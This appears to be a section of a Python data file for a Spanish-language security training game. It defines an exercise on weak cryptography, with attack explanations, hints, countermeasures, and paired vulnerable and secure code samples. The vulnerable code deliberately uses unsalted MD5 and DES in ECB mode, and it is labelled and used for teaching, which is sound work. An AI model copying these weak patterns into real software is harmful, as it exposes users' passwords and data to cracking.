        """,
        
        "attack_explanation": """
        ¿CÓMO SE ROMPEN ESTOS ALGORITMOS?
        
        1. FUERZA BRUTA CONTRA DES
           - 56 bits = 2^56 = 72 trillones de combinaciones
           - Computadoras modernas lo hacen en horas
           - GPUs lo hacen en minutos
           
        2. TABLAS RAINBOW
           - Precomputar millones de hashes
           - Búsqueda rápida en O(1)
           - Efectivo sin salt
           
        3. COLISIONES DE HASH
           - MD5 tiene colisiones conocidas
           - Crear dos archivos con mismo MD5
           - Bypass de validación
           
        4. CRIPTOANÁLISIS DE ECB
           - Bloques iguales = mismo ciphertext
           - Patrón visible en imágenes
           - Información sobre plaintext
        """,
        
        "real_world_impact": """
        IMPACTO EN EL MUNDO REAL:
        
        ⚠️ Compromiso de Credenciales
        - Craqueo de contraseñas
        - Rainbow tables precomputadas
        - Fuerza bruta exitosa
        
        ⚠️ Falsificación de Certificados
        - Colisiones de hash permitidas
        - Certificados SSL falsificados
        
        ⚠️ Descifrado de Datos
        - Recuperación de mensajes cifrados
        - Exposición de información sensible
        
        💰 Casos históricos:
        - Adobe (2013): 153 millones de hashes MD5 comprometidos
        - PayPal (2012): Acceso a transacciones mediante SHA-1
        - Windows (2008): LM hashes cracked rápidamente
        """,
        
        "countermeasures": """
        CONTRAMEDIDAS EFECTIVAS:
        
        1. USAR ALGORITMOS MODERNOS
           - SHA-256 o SHA-3 para hashing
           - AES-256 para encriptación
           - ChaCha20 como alternativa
           
        2. KEY DERIVATION FUNCTIONS
           - bcrypt para contraseñas
           - argon2 para máxima seguridad
           - PBKDF2 como alternativa
           
           from bcrypt import hashpw, gensalt
           hashed = hashpw(password.encode(), gensalt(rounds=12))
           
        3. USAR IV/NONCE ALEATORIO
           - Cada encriptación diferente
           - CBC, CTR, GCM mode
           - Evitar ECB
           
        4. AUTHENTICATION CON HMAC
           - Verificar integridad
           - MAC con clave secreta
           - Evitar solo encriptación
           
        5. GESTIÓN DE CLAVES SEGURA
           - Almacenar en Key Vault
           - Rotación periódica
           - No hardcodear
        """,
        
        "best_practices": """
        MEJORES PRÁCTICAS:
        
        ✅ Usar bcrypt/argon2 para contraseñas
        ✅ Usar AES-256-GCM para encriptación
        ✅ Siempre usar salt único
        ✅ Usar IV aleatorio
        ✅ Verificar integridad con HMAC
        ✅ Usar librerías criptográficas probadas
        ✅ Actualizar algoritmos regularmente
        ✅ Almacenar claves de forma segura
        """,
        
        "learning_objectives": [
            "Entender debilidades de algoritmos",
            "Diferenciar algoritmos seguro e inseguros",
            "Implementar hashing seguro",
            "Usar modos de encriptación seguros",
            "Gestionar claves criptográficas"
        ],
        
        "vulnerable_code": """
# CÓDIGO VULNERABLE
import hashlib
from Crypto.Cipher import DES
import base64

def hash_password_vulnerable(password):
    # ❌ VULNERABLE: MD5 sin salt
    return hashlib.md5(password.encode()).hexdigest()

def encrypt_data_vulnerable(data, key):
    # ❌ VULNERABLE: DES con solo 8 bytes
    # ❌ VULNERABLE: ECB mode sin IV
    cipher = DES.new(key[:8], DES.MODE_ECB)
    ciphertext = cipher.encrypt(data)
    return base64.b64encode(ciphertext)

# Ejemplos de uso (vulnerables):
pwd_hash = hash_password_vulnerable("password123")
# Rainbow tables podrían contener este hash

encrypted = encrypt_data_vulnerable(b"secret_msg_1234", b"weakkey1")
# Alguien con GPU puede romper DES en minutos
""",
        
        "vulnerable_code_language": "python",
        
        "vulnerable_code_explanation": """
        Problemas críticos:
        1. MD5 sin salt (vulnerable a rainbow tables)
        2. DES con solo 56 bits (rompe en horas/minutos)
        3. ECB mode (revela patrones)
        4. Sin IV (encriptaciones iguales dan mismo resultado)
        """,
        
        "secure_code": """
# CÓDIGO SEGURO
import bcrypt
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

def hash_password_secure(password):
    # ✅ SEGURO: bcrypt con rounds suficientes
    salt = bcrypt.gensalt(rounds=12)  # Tarda ~250ms, óptimo
    return bcrypt.hashpw(password.encode(), salt)

def verify_password_secure(password, hashed):
    # ✅ SEGURO: Verificación segura
    return bcrypt.checkpw(password.encode(), hashed)

def encrypt_data_secure(data, key):
    # ✅ SEGURO: AES-256-GCM (encriptación + autenticación)
    # IV debe ser aleatorio para cada encriptación
    iv = os.urandom(12)  # 96 bits para GCM
    
    cipher = Cipher(
        algorithms.AES(key),  # AES-256 si key es 32 bytes
        modes.GCM(iv),
        backend=default_backend()
    )
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    
    # Retornar IV + ciphertext + tag
    return iv + ciphertext + encryptor.tag

def decrypt_data_secure(encrypted_data, key):
    # ✅ SEGURO: Extraer IV y verificar autenticidad
    iv = encrypted_data[:12]
    ciphertext = encrypted_data[12:-16]
    tag = encrypted_data[-16:]
    
    cipher = Cipher(
        algorithms.AES(key),
        modes.GCM(iv, tag),
        backend=default_backend()
    )
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()

# Generar clave segura de 256 bits
key = os.urandom(32)

# Ejemplo de uso (seguro):
pwd_hash = hash_password_secure("password123")
print(f"Hash: {pwd_hash}")

encrypted = encrypt_data_secure(b"secret_msg_1234", key)
print(f"Encrypted: {encrypted.hex()}")

decrypted = decrypt_data_secure(encrypted, key)
print(f"Decrypted: {decrypted}")
""",
        
        "secure_code_language": "python",
        
        "secure_code_explanation": """
        Mejoras de seguridad:
        1. bcrypt con 12 rounds para contraseñas
        2. AES-256-GCM para encriptación
        3. IV aleatorio de 96 bits
        4. Autenticación integrada (tag)
        5. Claves criptográficamente seguras
        """,
        
        "hint_1": "¿Qué función hash es vulnerable a rainbow tables sin salt?",
        
        "hint_2": "DES tiene solo 56 bits. ¿Cuánto tiempo tardaría una GPU en romperlo?",
        
        "hint_3": "Intenta crackear un hash MD5 usando un sitio online como crackstation. ¿Lo encuentras en segundos?",
        
        "test_endpoint": "/api/exercises/5/test",
        "test_payload": "md5_hash",
        "expected_result": "Hash cracked successfully",
        
        "references": [
            "OWASP Cryptography: https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html",
            "CWE-327: https://cwe.mitre.org/data/definitions/327.html",
            "Crackstation: https://crackstation.net/"
        ]
    }
}

# Información adicional de progresión
PROGRESSION = {
    "level_1": {
        "title": "Fundamentos de Seguridad",
        "challenges": ["1_sql_injection_login", "2_xss_comment_section"],
        "rewards": ["🏅 Novato en Inyecciones"],
        "unlocks": ["level_2"]
    },
    "level_2": {
        "title": "Autenticación y Control de Acceso",
        "challenges": ["3_broken_authentication_weak_session"],
        "rewards": ["🏆 Experto en Sesiones"],
        "unlocks": ["level_3"]
    },
    "level_3": {
        "title": "Seguridad Avanzada",
        "challenges": ["4_insecure_deserialization", "5_weak_encryption"],
        "rewards": ["👑 Maestro en Seguridad Ofensiva"],
        "unlocks": []
    }
}
